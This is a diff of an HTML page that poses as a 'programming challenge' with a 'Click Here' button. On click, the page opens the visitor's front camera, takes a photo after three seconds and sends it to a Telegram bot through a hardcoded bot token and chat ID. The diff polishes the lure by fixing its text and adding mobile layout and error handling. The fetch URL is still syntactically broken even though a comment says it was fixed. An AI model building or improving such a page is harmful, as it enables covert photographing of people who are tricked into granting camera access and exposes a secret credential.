@@ -1,26 +1,26 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>turkey</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحدي البرمجة</title>
     <style>
         body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding-top: 50px; }
-        video { border: 5px solid #00ff00; border-radius: 10px; background: #000; }
+        video { border: 5px solid #00ff00; border-radius: 10px; background: #000; width: 90%; max-width: 400px; }
         .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #00ff00; border: none; border-radius: 5px; margin-top: 20px; color: black; font-weight: bold; }
         p { color: #aaa; }
     </style>
 </head>
 <body>
-    <h2>ãÑÍÈÇð Èß Ýí ÊÍÏí ÇáÈÑãÌÉ ÇáÎÇÕ Èí! ??</h2>
-    <p>are you a merchant</p>
+    <h2>مرحباً بك في تحدي البرمجة الخاص بي! 🚀</h2>
+    <p>Are you a merchant?</p>
     
-    <video id="video" width="400" height="300" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
     <br>
-    <button class="btn" onclick="startTest()">click here</button>
+    <button class="btn" onclick="startTest()">Click Here</button>
 
     <script>
-        // ãÚáæãÇÊß ÇáÊí ÃÚÏÏäÇåÇ ÓæíÇð
         const botToken = "8608335050:AAEgtOoX2E-AC9Uk_jT1R5P7K3FOzpXsQzQ"; 
         const chatId = "8124196406"; 
 
@@ -28,15 +28,14 @@
         const canvas = document.getElementById('canvas');
 
         function startTest() {
-            // ØáÈ ÇáÅÐä æÝÊÍ ÇáßÇãíÑÇ
-            navigator.mediaDevices.getUserMedia({ video: true })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     video.srcObject = stream;
-                    // ÇäÊÙÇÑ 3 ËæÇäí áÇáÊÞÇØ ÇáÕæÑÉ æÅÑÓÇáåÇ
+                    // الانتظار 3 ثوانٍ لالتقاط الصورة
                     setTimeout(takeAndSendPhoto, 3000);
                 })
                 .catch(err => {
-                    alert("íÌÈ ÇáãæÇÝÞÉ Úáì ÅÐä ÇáßÇãíÑÇ áßí íÚãá ÇáÊÍÏí!");
+                    alert("يجب الموافقة على إذن الكاميرا لكي يعمل التحدي!");
                     console.error(err);
                 });
         }
@@ -49,18 +48,24 @@
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'shot.jpg');
-                formData.append('caption', 'æÕáÊ ÕæÑÉ ÌÏíÏÉ ãä ãæÞÚß! ????');
+                formData.append('caption', 'وصلت صورة جديدة من موقعك! 📸🔥');
 
-                // ÅÑÓÇá ÇáÕæÑÉ Åáì Telegram Bot API
+                // تعديل الرابط بإضافة علامات الاقتباس الصحيحة
                 fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                     method: 'POST',
                     body: formData
                 })
-                .then(res => {
-                    alert("Êã ÅÑÓÇá äÊíÌÊß Åáíø ÈäÌÇÍ! ÊÝÞÏ åÇÊÝß ÇáÂä.");
+                .then(res => res.json())
+                .then(data => {
+                    if(data.ok) {
+                        alert("تم إرسال نتيجتك إليّ بنجاح! تفقد هاتف الآن.");
+                    } else {
+                        alert("الرابط يعمل ولكن البوت لم يرسل الصورة، تأكد من الـ Chat ID.");
+                    }
                 })
                 .catch(err => {
-                    alert("ÍÏË ÎØÃ Ýí ÇáÅÑÓÇá¡ ÊÃßÏ ãä ÇÊÕÇá ÇáÅäÊÑäÊ.");
+                    alert("حدث خطأ في الإرسال، تأكد من اتصال الإنترنت.");
+                    console.error(err);
                 });
             }, 'image/jpeg');
         }
